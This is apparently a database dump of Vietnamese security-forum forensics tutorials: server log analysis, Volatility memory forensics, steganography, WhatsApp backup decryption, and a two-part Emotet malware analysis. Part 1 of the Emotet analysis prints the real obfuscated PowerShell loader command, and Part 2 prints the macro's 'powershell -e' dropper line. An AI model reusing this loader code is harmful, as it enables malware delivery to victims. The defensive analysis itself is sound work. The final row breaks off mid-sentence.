USER=root ; COMMAND=/sbin/iptables -A INPUT -p ssh -dport 2424 -j ACCEPT<br><br>\r\nApr 24 20:03:44 app-1 sudo:     root : TTY=pts/2 ; PWD=/etc ; USER=root ; COMMAND=/sbin/iptables -A INPUT -p tcp -dport 53 -j ACCEPT<br><br>\r\nApr 24 20:04:13 app-1 sudo:     root : TTY=pts/2 ; PWD=/etc ; USER=root ; COMMAND=/sbin/iptables -A INPUT -p udp -dport 53 -j ACCEPT<br><br>\r\nApr 24 20:06:22 app-1 sudo:     root : TTY=pts/2 ; PWD=/etc ; USER=root ; COMMAND=/sbin/iptables -A INPUT -p tcp --dport ssh -j ACCEPT<br><br>\r\nApr 24 20:11:00 app-1 sudo:     root : TTY=pts/2 ; PWD=/etc ; USER=root ; COMMAND=/sbin/iptables -A INPUT -p tcp --dport 53 -j ACCEPT<br><br>\r\nApr 24 20:11:08 app-1 sudo:     root : TTY=pts/2 ; PWD=/etc ; USER=root ; COMMAND=/sbin/iptables -A INPUT -p tcp --dport 113 -j ACCEPT<br><br>\r\n\r\n4 Server này còn có những vấn đề gì khác ?<br><br>\r\n• Rõ ràng là SSH cho phép truy cập tài khoản root, mật khẩu yếu dẫn đến việc bị bruteforce<br><br>\r\n• Từ daemon.log thấy:<br><br>\r\n\r\nMã:<br><br>\r\nMar 18 10:18:42 app-1 /etc/mysql/debian-start[7566]: WARNING: mysql.user contains 2 root accounts without password!<br><br>\r\n\r\n2 tài khoản root không đặt mật khẩu, Đây rõ ràng là một vấn đề an ninh nghiêm trọng, do lỗi cấu hình của quản trị viên<br><br>\r\n• Log access của web cho thấy có 1 số request nhờ server thành 1 proxy, nhưng đã bị chặn.<br><br>\r\nMã:<br><br>\r\n221.192.199.35 - - [19/Apr/2010:09:23:37 -0700] \"GET http://www.wantsfly.com/prx2.php?hash=FABB83E72D135F1018046CC4005088B36F8D0BEDCEA7 HTTP/1.0\" 404 1466 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" YhL5XgoAAQ4AAEP2EQcAAAAC 11250471<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(38, 'Forensic 5 - Memory Forensics', '', '<div class=\"bbWrapper\"><i><b>I. Giới thiệu:<br>\r\n</b></i><br>\r\n- Trước hết, xin được phép nhắc lại kiến thức về Computer Foresic đã được đề cập trong các bài viết trước trên whitehat forum:<br>\r\n<br>\r\n<i>“<b>Computer Forensics Là gì ?</b></i><br>\r\n<i>Trong lĩnh vực an toàn thông tin, Computer Forensics hay còn gọi là điều tra số là công việc phát hiện, bảo vệ và phân tích thông tin được lưu trữ, truyền tải hoặc được tạo ra bởi một máy tính hoặc mạng máy tính, nhằm đưa ra các suy luận hợp lý để tìm nguyên nhân, giải thích các hiện tượng trong quá trình điều tra.”<br>\r\n</i><br>\r\n- Trong bài viết này, chúng ta đề cập đến Memory Forensics, đây cũng là một mảng quan trọng và cũng rất thú vị của forensics với đối tượng là dữ liệu được lưu trên bộ nhớ, thường là dữ liệu được dump ra từ RAM.<br>\r\n<br>\r\n- Memory Forensics mang những đặc điểm chung của Computer Forensics là:<div style=\"margin-left: 20px\">+ Dữ liệu cần phân tích thường lớn hoặc rất lớn​</div><div style=\"margin-left: 20px\">+ Dữ liệu có thể không còn nguyên vẹn, bị thay đổi, bị phần mảng.​</div><div style=\"margin-left: 20px\">+ Dữ liệu dễ dàng bị giả mạo<br>​</div><br>\r\n<i><b>II. Công cụ:</b></i><br>\r\n<br>\r\n- Hiện tại để dump dữ liệu từ RAM trên Windows, ta có thể sử dụng những công cụ như DumpIt…<br>\r\n- Để phân tích file dump, thời kì đầu các chuyên gia về Memory Forensics thường sử dụng những strings và grep, đây là những công cụ tìm kiếm dữ liệu trong file theo khuôn mẫu chứ không được phát triển cho Forensics.<br>\r\n- Về sau, xuất hiện những công cụ được phát triển dành riêng cho Memory Forensics như Volatility, MoonSols…<br>\r\n<br>\r\n<i><b>III. Case study:<br>\r\n</b></i><br>\r\nBạn nhận được một file dmp từ một máy tính bị tấn công. Hãy tìm cách lấy ra được nhiều thông tin nhất có thể về sự cố.<br>\r\n<br>\r\nFile:<div style=\"margin-left: 20px\"><a href=\"https://dl.dropboxusercontent.com/u/50505098/xcom.zip\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F50505098%2Fxcom.zip&amp;hash=d4eac578f68f1e46b018fd00e2030d3d\" rel=\"nofollow ugc noopener\">xcom.vmem</a>​</div>Công cụ:<div style=\"margin-left: 20px\">Volatility<br>​</div><br>\r\n1. Lấy thông tin về HĐH:<br><br>\r\n<img src=\"Imageass/missing-image.png\">\r\n<br><br>\r\nKết quả nhận được từ Volatility cho thấy HĐH được cài trên máy là Windows XP, phiên bản SP2 hoặc SP3 32bit.<br><br>\r\n2. Hiển thị tiến trình:<br><br>\r\n	\r\n		<img src=\"Imageass/missing-image.png\">\r\n<br><br><br>\r\nTừ đây có thể thấy những process (cùng thông tin PID, PPID, số Threads…) đang chạy trong máy nạn nhân lúc dump ra file ảnh.<br>\r\nDành sự một chút sự chú ý đến process AcroRd32.exe. Đây là Acrobat Reader, được mở từ PID 888 - trình duyệt Firefox.<br><br>\r\n3. Lấy ra danh sách sockets:<br><br>\r\n<img src=\"Imageass/missing-image.png\">\r\n<br><br>\r\nLại có:<br>\r\n<br>\r\n<img src=\"Imageass/missing-image.png\">\r\n<br>\r\n<br>\r\n- Qua những thông tin trên, ta có được 2 IP đáng ngờ được mở: 192.104.22.71 (Malta hosting) và 212.150.164.203 (Israeli). Có thể truy vấn thêm thông tin từ IP này thông qua dịch vụ Whois.<br>\r\n<br>\r\n- Chi tiết:<div style=\"margin-left: 20px\">Một process được kết nối với Malta hosting: svchost.exe (PID 880)​</div><div style=\"margin-left: 20px\">Hai process được kết nối với Israeli hosting: firefox.exe (PID 888) và AcroRd32.exe (PID 1752)​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(39, 'Forensic 6 - Steganography', '', '<div class=\"bbWrapper\">\r\n    <div style=\"text-align: center\">\r\n        <span style=\"font-size: 28px\">\r\n            <b>\r\n                <span style=\"color: #a52a2a\">Tổng quan về Steganography</span>\r\n            </b>\r\n        </span>\r\n    ​</div><br>\r\n    <b><span style=\"font-size: 14px\">1. Steganography là gì?</span></b><br><br>\r\n    Theo wikipedia, Steganography là nghệ thuật và khoa học về việc giấu thông điệp, \r\n    hình ảnh, hoặc dữ liệu trong một thông điệp khác, hỉnh ảnh khác hoặc dữ liệu khác. \r\n    Thông thường, thông điệp ẩn sẽ được ẩn dấu trong một ảnh, một bài viết, một đoạn văn bản,\r\n    hay thậm chí là một danh sách mua sắm. Ví dụ cụ thể: thông điệp ẩn có thể được viết bằng \r\n    mực vô hình (invisible ink), nằm giữa các dòng chữ nhìn thấy được bởi mắt thường của một bức thư.<br><br>\r\n    <b><span style=\"font-size: 14px\">2. Phân biệt Steganography và Cryptography</span></b><br><br>\r\n    Về Cryptography, bạn đọc có thể tìm hiểu qua loạt bài về Cryptography trên Whitehat forum:<br>\r\n    <a href=\"http://whitehat.vn/threads/7220-Crypto-01-Tong-quan-ve-Cryptography.html\">http://whitehat.vn/threads/722...ptography.html</a><br>\r\n    Ưu điểm của Steganography so với Cryptography là thông điệp bí mật không gây bất kì sự chú ý nào từ phía đối tượng giám sát bởi nó đã được\r\n    giấu đi. Tất nhiên điều này tốt hơn so với một thông điệp đã được mã hóa nhưng lại không ẩn đi ( ở đây không nói đến việc thông điệp này có \r\n    thể giải mã được không ) mà để cho người ta nhìn thấy và quan tâm.<br>\r\n    Kết hợp Steganography với Cryptography một cách hợp lý, ta sẽ đảm bảo được tính an toàn của thông điệp hơn nhiều lần.<br><br>\r\n    <b><span style=\"font-size: 14px\">3. Phương pháp LSB (LEAST SIGNIFICANT BIT) trong Steganography</span></b><br><br>\r\n    Trong xử lý ảnh, mỗi pixel nói chung được lưu dưới dạng 8 bit hay 24 bit. Với biểu diễn 24 bit, mỗi pixel trải trên 3 byte, mỗi byte \r\n    ứng với các màu đỏ, xanh da trời và xanh lá cây (RGB). Các màu là sự kết hợp của 3 màu trên. Mỗi byte có giá trị từ 0 - 255 \r\n    ứng với cường độ màu. Màu tối nhất có giá trị 0, màu sáng nhất có giá trị 255.<br><br>\r\n    <img src=\"Imageass/1490893070RGB.png\"><br>\r\n    Có rất nhiều phương pháp để che giấu thông tin trong các hình ảnh số nhưng phương pháp dụng nhất là chèn bit có trọng số nhỏ nhất (LSB). Ví dụ ta có: 11110110 là một số nhị phân 8 bit. Bit tận cùng bên phải ( bit 0 ) được gọi là bit LSB vì sự thay đổi của nó có ảnh hưởng ít nhất đến giá trị của số. Dữ liệu nhị phân của thông báo mật sẽ bị chia nhỏ ra và thay thế các bit LSB của từng byte trong giá trị RGB của từng Pixel. Sỡ dĩ chúng ta chỉ thay thế các bit LSB là vì sau khi thay đổi các giá trị trong RBG chỉ dao động 1 đơn vị, dùng mắt thường sẽ khó phát hiện ra sự thay đổi của bức ảnh, giúp đạt được mục đích ẩn dấu.<br>\r\n    Bởi mỗi pixel được tạo nên từ 3 kênh màu (RGB), nên ta có thể dấu tối đa 3 bit của thông báo mật. Hình minh họa:<br><br>\r\n    <img src=\"Imageass/1490893070Untitled.png\"><br>\r\n    Tóm gọn lại thì ta có các bước để dấu một thông điệp ẩn vào một bức ảnh bằng phương pháp LSB:<br>\r\n    +Chuyển thông điệp bí ẩn sang dạng nhị phân.<br>\r\n    +Thay từng 3 bit của thông điệp vào LSB của các pixel liên tiếp trong ảnh cho đến khi hết thông điệp.<br>\r\n    +Lưu lại bức ảnh mới đã chứa thông điệp mật của ta.<br>\r\n    Việc thực hiện dấu thông tin bằng LSB này hoàn toàn thực hiện được bằng một đoạn code ngắn mà bạn tự viết ra. Nếu không bạn có thể sử dụng các phần mềm có sẵn trên mạng để thực hiện thay. Ở đây mình thử nghiệm bằng phần mềm Stenography Tool và thấy nó thực hiện khá tốt. Ảnh sau khi che dấu thông tin nhìn chẳng khác gì ảnh gốc. Các bạn có thể tải phần mềm này tại: <a href=\"http://sourceforge.net/projects/stegtool/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fsourceforge.net%2Fprojects%2Fstegtool%2F&amp;hash=fdbbe6189099690a105d09b1931283c8\" rel=\"nofollow ugc noopener\">http://sourceforge.net/projects/stegtool/</a><br><br>\r\n    <img src=\"Imageass/1489939937Capture.PNG\"><br>\r\n    Việc lấy lại thông điệp mật từ ảnh thì chỉ là thực hiện hoàn toàn ngược lại với việc ẩn dấu. Ta sẽ không gặp khó khăn gì trong việc lấy lại được thông điệp ẩn trừ khi nó đã được mã hóa trước khi dấu đi. Ở đây mình sử dụng tool <a href=\"http://www.wechall.net/forum-t527/Stegsolve_1_3.html\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=http%3A%2F%2Fwww.wechall.net%2Fforum-t527%2FStegsolve_1_3.html&amp;hash=2b6b48e50246beba823ecbdb8a307899\" rel=\"nofollow ugc noopener\">StegSolve</a> để lấy một thông điệp ẩn từ một ảnh cho trước (ảnh này được lấy từ một đề thi CTF). Bạn có thể download file zip đính kèm theo bài viết để lấy ảnh thực hành.<br><br>\r\n    [video=youtube;WsVxZgkqRf0]\r\n    <div class=\"bbMediaWrapper\">\r\n    <div class=\"bbMediaWrapper-inner\">\r\n        <iframe src=\"https://www.youtube.com/embed/WsVxZgkqRf0?wmode=opaque&amp;start=0\" width=\"560\" height=\"315\" frameborder=\"0\" allowfullscreen=\"true\"></iframe>\r\n    </div><br>\r\n    </div>\r\nChú ý là trong clip trên, mình chỉ extract data từ chỉ một kênh màu đỏ (RED) chứ không phải trên cả ba kênh RGB.<br><br>\r\n<b><span style=\"font-size: 14px\">4. Ứng dụng của Steganography</span></b><br><br>\r\nVới sự hoàn hảo của các tiện ích đa phương tiện số và những tiến bộ của công nghệ, Steganography ngày càng phát triển và được ứng dụng khắp nơi. Trong lĩnh vực an toàn thông tin, nó được kết hợp với các phương pháp trong Cryptography để có thể chuyển các thông báo mật đi dưới một bức tranh, một bản nhạc vô hại, nhờ thế làm tăng thêm vòng bảo mật của chúng. Trong lĩnh vực sở hữu trí tuệ, nó được xem như một cơ chế tuyệt hảo để chống gian lận, giả mạo và lạm dụng bản quyền. Các nhà công nghiệp đã đầu tư hàng triệu đô la vào các kỹ thuật che giấu các logo của các công ty và các dấu hiệu bản quyền khác trong các hình ảnh số, các bản ghi video và âm nhạc…\r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(40, 'Forensic 7 - Mobile Data - WhatsApp', '', '<div class=\"bbWrapper\">\r\nVới sự tăng trưởng theo cấp số nhân của số lượng các thiết bị di động (trong 1.6 tỉ thiết bị di động được bán trong năm 2010 thì 19% trong số đó là smartphone), dù muốn hay không, các thiết bị di động đang dần thu hút sự chú ý của tội phạm mạng. Dù là chuyên gia hay người dùng bình thường, mọi người cũng cần trang bị những kiến thức cần thiết để bảo vệ chính mình trước các nguy cơ từ tội phạm mạng.<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/Forensic.png\">\r\n    </div><br>\r\n    Bài viết này sẽ thảo luận về việc sử dụng Forensics để khai thác dữ liệu cá nhân, tin nhắn trong database của một trong những phần mềm OTT (Over-The-Top) nổi tiếng và đắt giá nhất hiện nay – WhatsApp.<br>\r\n    <br>\r\n    \r\n        <div class=\"bbCodeBlock-content\">\r\n            <div class=\"bbCodeBlock-expandContent js-expandContent \">\r\n                <i>WhatsApp là một ứng dụng nhắn tin đa nền tảng, cho phép bạn nhắn tin mà không cần phải trả phí tin nhắn SMS.</i>\r\n            </div>\r\n            <div class=\"bbCodeBlock-expandLink js-expandLink\"><a role=\"button\" tabindex=\"0\">Nhấn để mở rộng...</a></div>\r\n        </div><br>\r\n    <b>Case study:</b><br>\r\n    Tình huống giả định: các bạn được cung cấp một file Android Backup – được dump ra từ dữ liệu trên máy và thẻ nhớ của một người dùng Android. Trên máy có cài WhatsApp và đã được sử dụng. Hãy đọc các nội dung mà người dùng Android này đã trao đổi với “bên ngoài” thông qua WhatsApp.<br>\r\n    <div style=\"text-align: right\"><i>(File được lấy từ bài Forensics 300 trên Whitehat Contest Grand Prix 2014)</i><br>​</div>Trước khi đi vào phân tích Forensics, ta cần phải xác định rõ dữ liệu đầu vào có những gì, và mục tiêu của quá trình phân tích, kiên nhẫn không bỏ sót dù một bit của dữ liệu.<br>\r\n    <br>\r\n    Input: file: for300.zip (~115MB)<br>\r\n    Unzip file =&gt; được file for300<br>\r\n    <div style=\"text-align: center\"><br>\r\n        <img src=\"Imageass/1.PNG\">\r\n    </div><br>\r\n    Có thể dùng các tool hexeditor hoặc dùng lệnh file nên linux để xác định định dạng file:<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>$~  file for300\r\n    for300: Android Backup, version 1, compressed, unencrypted</code></pre>\r\n        </div>\r\n    </div><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/2.PNG\">\r\n    </div><br>\r\n    “Google is your friend”, tìm cách extract Android Backup, mình sử dụng Android Backup Extractor.<br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>java -jar abe.jar unpack for300 output.tar</code></pre>\r\n        </div>\r\n    </div><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/3.PNG\">\r\n    </div><br>\r\n    Sau khi extract được dữ liệu trong file Android Backup vừa có, review lại một lượt các file có thể khai thác được.<br>\r\n    Vì case study của chúng ta là về WhatsApp, do vậy sẽ tập trung tìm những file/folder dữ liệu có liên quan trực tiếp đến WhatsApp.  Không quá khó khăn để thấy một file database: msgstore.db.crypt7 ở ../shared/0/WhatsApp/Databases/<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/4.PNG\">\r\n    </div><br>\r\n    msgstore.db.crypt7 là một file database đã được WhatsApp mã hóa, sử dụng crypt7. Để khai thác, ta cần có thêm file key, dễ dàng tìm thấy ở: ..apps/com.whatsapp/f/<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/5.PNG\">\r\n    </div><br>\r\n    Sử dụng công cụ WhatsApp Viewer để khôi phục dữ liệu gốc từ file đã được mã hóa. Từ đoạn dữ liệu này, chúng ta có thể đọc được tin nhắn, cùng rất nhiều thông tin nhạy cảm của người dùng.</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(41, 'Forensic8: Emotet - Catch me if you can (Part 1)', '', '<div class=\"bbWrapper\">Gần đây Emotet có dịp bùng phát lại và được biết đến như  là công cụ ưu thích được các blackhat, các nhóm tội phạm công nghệ cao sử dụng làm công cụ phát tán và lây nhiễm mở rộng phạm vi ảnh hưởng đến toàn Thế Giới. Vì vậy, mình xin chia sẻ bài viết về loại malware này.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/e1.jpg\">\r\n    </div><br>\r\n    Mình sẽ làm một bản overview về cách thức hoạt động, lây nhiễm của Emotet. Emotet được biết đến là một file thực thi mục đích ban đầu để lây nhiễm vào hệ thống máy chủ ngân hàng với tên gọi phổ biến trojan banking. Tuy nhiên trong những năm gần đây nó đã trở thành một mạng lưới phân phối độc hại hơn nhiều. Khi nạn nhân bị nhiễm, nó có thể thực hiện các chiến dịch spam email hoặc tiếp tục lây nhiễm bằng cách tải các phần mềm độc hại. Có thể nói Emotet là một chiến dịch lây nhiễm chuyên nghiệp, đa dạng và trở nên tinh vi hơn, việc dựa vào các signature đã được công bố là khó để phát hiện hết.<br><br>\r\n    <b>“Emotet is polymorphic, which means it can change itself every time it is downloaded, evading signature-based detection.” - Malwarebytes<br><br>\r\n    Vòng đời lây nhiễm</b><br><br>\r\n    Emotet chủ yếu được phát tán dựa vào các chiến dịch lừa đảo qua email. Người dùng sẽ nhận được các email được xây dựng một cách hợp lý như các hóa đơn, đơn đặt hàng online chưa được thanh toán:<b> “Your Invoice”, “Payment Detail”.</b> Người dùng mở tài liệu, là một tập tin đính kèm mã độc hại, theo sau là các câu lệnh Powershell thực thi tự động load các URL để kéo xuống các tập tin đính kèm malware Emotet<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/e2.png\">\r\n    </div><br>\r\n    <b>“Current versions of the Emotet Trojan include the ability to install other malware to infected machines. This malware may include other banking Trojans or malspam delivery services.” - Malwarebytes<br>\r\n    Ví dụ</b><br>\r\n    Trong ví dụ này, nạn nhân sẽ nhận được một email về đơn đặt hàng mà họ đã đặt, tệp đính kèm có tên là Untitled-84617482333317.doc<br><br>\r\n    Tập tin đính kèm là một file word có chứa marco đã được ẩn bên trong và có chứa một vài thông tin giả về đơn hàng nhằm tấn công Social Engineering thuyết phục người dùng bật tính năng Enable Editing để thực thi mã macro chứa bên trong<br><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/e3.png\">\r\n    </div><br>\r\n    Ở góc trên cùng bên trái của tập tin là một text box nhỏ, nếu bạn kéo mở rộng nó ra, bạn sẽ tìm được các dòng lệnh lệnh thực thi độc hại gọi đến chương trình cmd.exe. Macro lấy nội dung của hộp text box này và sau đó gọi cmd.exe, chuyển nội dung của text box làm tham số truyền vào để thực thi mã độc trên powershell theo ý muốn của hacker.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/e4.png\">\r\n    </div><br>\r\n    <b>The Batch Script</b><br>\r\n    <br>\r\n    Các dòng lệnh được obfuscated (làm rối mã code). Các dòng lệnh này sử dụng rất nhiều biến môi trường để phù hợp với các dòng lệnh thực thi của nó. Hacker chèn các đoạn mã này vào với 2 mục đích: bypass các chương trình anti-virus phân tích tĩnh và cung cấp môi trường cần thiết  để phần mềm độc hại có thể thực thi và vượt qua anti-virus dựa vào cơ chế anti-analysic (chống phân tích).<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/b1.png\">\r\n    </div><br>\r\n    Sử dụng oledump ta có thể thấy được các thành phần marcos được đính kèm bên trong tập tin.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/b2.png\">\r\n    </div><br>\r\n    Tiến hành dump strings  để lấy các ký tự đã bị obfuscated<br>\r\n    <br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>CMD C:wINdowssystEM32cMd /c “SEt KQI= (nEW-oBJecT SySTem.Io.StReaMReaDEr( ( nEW-oBJecT io.cOMPReSsion.DeFLAtEStReAm([iO.MEmORYstrEAm] [SyStEm.CONVeRT]::fROMBASe64STRing( ‘PZBba8JAEIX/Sh4W1mDdVLBaXAK2FS8t2IpILfQlyY5mc9lJ48TYhvz3JlL7Ouc7H5xh0WbqGih76EcQkLUCEu/gPyUaDEk22ymXh0TZ2HF8jQRHEgEKrZyzWr3Ny9G6P/mL4yKNU98zqjCHhkmdWbZ4SdV+dwUIgtBgiahaRQzOcA63D/Hzqb++IgbwkGORCY3OcAuLox++/td1dswx9Iy+2DH5+hgNBlxsskRTh0+4Ldl2rS3X4vd3Ay4ZPZYuA3MaE6RZl3/ybpt3uYAzcLnHHLwg7LDoZ2VpY7VT7Yry74o1LxFTLE2CnprpBC7MjdUKbbk0J4yht2ykl4v0G08s68CjIKzq+hc=’ ), [syStEM.iO.ComPReSsION.cOMPRESsIonMODe]::DeCoMPreSs) ) ,[TeXt.enCOdINg]::AsCII) ).REAdtOEnD( ) ^|^&amp;( ([strIng]$verBOsEpreFeRence)[1,3]+’X’-JoiN’’)&amp;&amp; PoWErshELL ^&amp; ( ”{0}{1}” -f’SET-ItE’,’m’ ) (‘Va’ +’RI’+ ‘AbLE:jW1V’) ( [tYpE](”{1}{0}{2}” -f’nVi’,’E’,’rONMENT’) ) ; ^&amp;( ${En`V:`comS`PeC}[4,24,25]-join’’ )( ( ( . ( ”{1}{0}{2}{3}” -f’-ch’,’gEt’,’IlDiT’,’EM’ ) ( ‘vA’ + ‘rI’+’aBle:jW1v’ ) ).VALue::( ”{3}{0}{1}{4}{6}{5}{2}” -f ‘Vir’,’On’,’BlE’,’gEten’,’Me’,’vaRIa’,’NT’ ).Invoke( ‘kqi’,( ”{0}{2}{1}” -f ‘pro’,’sS’,’CE’ ) ) ) )”</code></pre>\r\n        </div>\r\n    </div><br>\r\n    Ví dụ Batch Script bên trên đã được de-obfuscased, sau khi decode bạn sẽ nhận được các domain C&amp;C để drop các malware emotet.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/b3.png\">\r\n    </div><br>\r\n    Bài tiếp theo mình sẽ hướng dẫn các công cụ để phân tích và phát hiện ra các loại malware này<br><br>\r\n    <b>Tự bảo vệ khỏi Malware Emotet</b><br>\r\n    <ul>\r\n        <li data-xf-list-type=\"ul\">Đảm bảo thiết bị của bạn đã được cài đặt bản update mới nhất, chỉ sử dụng cổng 445 khi cần thiết, các biến thể sau này của Emotet đã được nâng cấp để khai thác được các lỗ hổng EternalBlue</li>\r\n        <li data-xf-list-type=\"ul\">Không tải xuống các tệp đính kèm đáng ngờ hoặc nhấp vào liên kết không đáng tin cậy. Emotet có thể có được chỗ đứng ban đầu trên hệ thống hoặc mạng của bạn nếu bạn tránh được những email nghi ngờ đó. Dành thời gian để hướng dẫn đồng nghiệp của bạn về cách phát hiện malspam.</li>\r\n        <li data-xf-list-type=\"ul\">Sử dụng mật khẩu mạnh và sử dụng xác thực 2 yếu tố</li>\r\n        <li data-xf-list-type=\"ul\">Sử dụng chương trình Anti-virus và cập nhật nó thường xuyên</li>\r\n    </ul>Tham khảo<br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\"><a href=\"https://www.malwarebytes.com/emotet/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwww.malwarebytes.com%2Femotet%2F&amp;hash=615e930d1f8fd588d8186560e047496d\" rel=\"nofollow ugc noopener\">Malwarebytes</a></li>\r\n    <li data-xf-list-type=\"ul\"><a href=\"https://www.bromium.com/emotet-technical-breakdown/#post/0\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwww.bromium.com%2Femotet-technical-breakdown%2F%23post%2F0&amp;hash=e8c024316b2c29a82a19082275d683d4\" rel=\"nofollow ugc noopener\">Bromium</a></li>\r\n    </ul>\r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(42, 'Forensic9: Emotet - Catch me if you can (Part 2)', '', '<div class=\"bbWrapper\">Hôm nay, mình xin chia sẻ phần 2 của emotet về phân tích mẫu <b>malware Emotet</b> cũng như cách phòng chống, phát hiện sớm để cảnh báo trên hệ thống đồng thời ngăn chặn trước khi người dùng thực thi mã độc.<br><br>\r\n    Dùng exiftool xem qua mẫu<br>\r\n    <div style=\"text-align: center\"><br>\r\n        <img src=\"Imageass/c1.png\"><br>\r\n    ​</div>Có khá nhiều trường thông tin và thông tin khá khó hiểu<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c2.png\">\r\n    </div><br>\r\n    Thử mở file dĩ nhiên không có gì đặt biệt ngoài dụ dỗ người dùng kích hoạt chế độ<b> \"Enable Editing\"</b> để thực thi mã độc trong macro<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c3.png\">\r\n    </div><br>\r\n    Đầu tiên mình sử dụng <b>oledump </b>để check các marco đã đính kèm<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c4.png\">\r\n    </div><br>\r\n    Ở các object 8 và 9 ta thấy có các nội dung rất nhiều ở phần Macros/VBA<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c5.png\">\r\n    </div><br>\r\n    Hiển thị các object gốc của VB<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c6.png\">\r\n    </div><br><br>\r\n    <img src=\"Imageass/c7.png\"><br>\r\n    Trước tiên, đoạn mã được thực thi từ 2 đoạn chính bằng cách gọi hàm Công khai (CYCbzCYCbzCYCbzCYCbzCYCbz) nằm ở dòng 7. Hàm này chịu trách nhiệm truy xuất các thuộc tính Tùy chỉnh của Tài liệu được lưu trữ dưới dạng một loại văn bản<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c8.png\">\r\n    </div><br>\r\n    Mỗi khi hàm (<b>CYCbzCYCbzCYCbzCYCbzCYCbz</b>) được gọi, nó sẽ lấy giá trị cho giá trị tên được truyền vào hàm (đầu tiên trong dòng 12 là giá trị tên <b>AGFvfLAGFvfLAGFvfLAGF </b>Các giá trị này sau đó được nối với nhau để tạo thành một chuỗi, ví dụ như chuỗi wscript.shell và powershell -e nếu không bị xáo trộn, rất dễ để các hệ thống An ninh thông tin phát hiện và đưa ra cảnh báo.<br><br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>CreateObject(wscript.shell).Run(powershell -e [base64 encoded Comments String], 0)</code></pre>\r\n        </div>\r\n    </div><br>\r\n    Sau khi tạo được các chuỗi tham chiếu nó sẽ lấy nội dung giá trị ở mục <b>“Comments”</b><br><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/c9.png\">\r\n    </div><br>\r\n    Ta có thể thấy được khi show đầy đủ các thông tin<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c10.png\">\r\n    </div><br>\r\n    Chuỗi base64 được mã hóa để làm cho các bước phân tích khó hơn trước các thiết bị cảnh báo An Ninh Thông Tin<br><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c11.png\">\r\n    </div><br>\r\n    Sau khi sắp xếp và làm sạch lại mọi thứ ta sẽ được như thế này. Powershell sẽ tạo tiến trình và tải xuống các tệp tin từ 1 trong các URL. Tệp sẽ được lưu tạ, thời vào đường dẫn Temp của người dùng với giá trị ngẫu nhiên trước khi thực thi<br><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/c12.png\">\r\n    </div><br><br><br>\r\n    <img src=\"Imageass/c13.png\"><br><br>\r\n    <img src=\"Imageass/c14.png\"><br>\r\n    <img src=\"Imageass/c15.png\"><br>\r\n    <div style=\"text-align: center\">​</div><b>Cách phòng chống và phát hiện: </b><br>\r\n    <div style=\"text-align: center\"><ul>\r\n        <li data-xf-list-type=\"ul\"><div style=\"text-align: left\">Sử dụng yara để detect nhanh các tập tin có chứa malware hoặc add vào các công cụ phân tích an ninh thông tin để có thể phát hiện và ngăn chặn kịp thời trước khi đến người 